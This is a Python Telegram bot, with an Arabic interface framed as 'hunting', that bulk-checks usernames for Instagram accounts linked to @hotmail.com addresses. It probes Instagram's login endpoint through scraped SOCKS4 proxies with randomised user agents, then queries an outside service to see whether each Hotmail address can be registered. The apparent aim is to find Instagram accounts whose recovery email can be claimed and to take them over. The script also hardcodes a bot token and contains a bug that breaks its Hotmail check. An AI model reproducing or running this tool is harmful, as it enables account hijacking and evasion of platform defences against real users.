import telebot
from telebot import types
import requests,os
from requests import post
from concurrent.futures import ThreadPoolExecutor
import requests
from secrets import token_hex
import uuid
from user_agent import generate_user_agent
from requests import post
from requests import get
import random , hashlib , time
from os import system,name
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
import requests
from hashlib import md5
from time import time
import os
import random	
import time
#-------------------------------------------------#
good=0
bad=0
bot = telebot.TeleBot('7061973890:AAH3CBJ-SJyj97DcZV9_CTi2n8dTULbJFoE')
user_step = {}
#-------------------------------------------------#
def hotmail(email):
	if "@" in email:
		email=email.split('@')[0]
	email=f"{email}@hotmail.com"
	req=requests.get(f"https://api-chk-hotmail-and-outlook-dbf8b3128391.herokuapp.com/check_email/email={email}").json()
	if 'success' in req['status']:
		return 'good'
	else:
		return 'bad'
def insta(email):
	def get_proxs():
		o=requests.get("https://github.com/Nuha-hub/check-insta/blob/main/proxies.txt").text
		oo='"]'
		m="["+o.split("['27.147.24.205:8080',")[1].split(f"'117.93.115.31:28643']{oo}")[0].strip()+"]"
		m = m.strip('[]').replace("'", "")
		my_list = m.split(',')
		proxy=random.choice(my_list)
		proxs= {'http': f'socks4://{proxy}'}
		return proxs
	def chk(email):
	  ma = requests.Session()
	  g = str(''.join(random.choice('qwertyuiopasdfghjklzxcvbnm') for i in range(8)))
	  password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{g}"
	  s3 = ma.get('https://www.instagram.com/accounts/login/')
	  rs3 = ma.get('https://www.instagram.com/accounts/login/')
	  ctk = rs3.text.replace("\\", "").split('csrf_token\":\"')[1].split('"')[0]
	  headers = {
	              "user-agent":generate_user_agent(),
	              "x-csrftoken": ctk,
	              "x-ig-www-claim": "0",
	          }
	  r=get_proxs()
	  rs3 = ma.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/",headers=headers,data={"enc_password": password,"username": email,"queryParams": "{}","optIntoOneTap": "false","trustedDeviceRecords": "{}"},proxies=r)
	
	  headers.update({"x-ig-set-www-claim":"0"})
	  headers.update({"x-csrftoken": ctk})
	  return  (rs3.text)
	return chk(email)
#-------------------------------------------------#
def chkhh(email):
	def chkhotmail(email):
		req=hotmail(email)['status']
		if 'good' in req:
			return 'good'
		else:
			return 'bad'
	
	def chkinsta(email):
		req=insta(email)
		if "html" in req:
			return chkhotmail(email)
		else:
			return 'bad'
	return chkinsta(email)
#-------------------------------------------------#
@bot.message_handler(commands=['start'])
def start(message):
	markup = types.InlineKeyboardMarkup()
	start_button = types.InlineKeyboardButton("بدء الصيد", callback_data='start_fishing')
	developer_button = types.InlineKeyboardButton("المطور", url='t.me/te9egram')
	markup.add(start_button, developer_button)
	bot.send_message(message.chat.id, "اختر أحد الخيارات:", reply_markup=markup)
#-------------------------------------------------#
@bot.message_handler(commands=['status'])
def status(message):
	global good,bad
	bot.send_message(message.chat.id,f"- good : {good}\n- bad : {bad}")
#-------------------------------------------------#
@bot.callback_query_handler(func=lambda call: call.data == 'start_fishing')
def start_fishing_callback(call):
	user_step[call.message.chat.id] = 'waiting_for_file'
	bot.send_message(call.message.chat.id, "يرجى إرسال الملف")
#-------------------------------------------------#
@bot.message_handler(func=lambda message: user_step.get(message.chat.id) == 'waiting_for_file', content_types=['document'])
def handle_document(message):
	global good , bad
	file_name = message.document.file_name
	file_id = message.document.file_id
	file_info = bot.get_file(file_id)
	downloaded_file = bot.download_file(file_info.file_path)
	with open(file_name, 'wb') as new_file:
		new_file.write(downloaded_file)
	bot.reply_to(message, "تم بدء الصيد.")
	user_step[message.chat.id] = None  
	file = open(file_name, "r")
	file = file.read().split('\n')
	num_threads = 15  
	with ThreadPoolExecutor(max_workers=num_threads) as executor:
		for guii in file:
			try:
				email=f"{guii}@hotmail.com"
				executor.submit(check_account,email , message.chat.id)
			except:
				pass

			
	print(f"تم الانتهاء-  من الفحص\n- hit : {good}\n- bad : {bad}")
	bot.send_message(message.chat.id,f"تم الانتهاء-  من الفحص\n- hit : {good}\n- bad : {bad}")
	os.remove(file_name)
	good=0
	bad=0
#-------------------------------------------------#
def check_account(email, chat_id):
	global good , bad
	oo = chkhh(email)
	if "good" in oo:
		good+=1
		bot.send_message(chat_id,f"- {oo}\n- email:{email}")
	else:
		bad += 1
#-------------------------------------------------#
bot.polling()
#-------------------------------------------------#
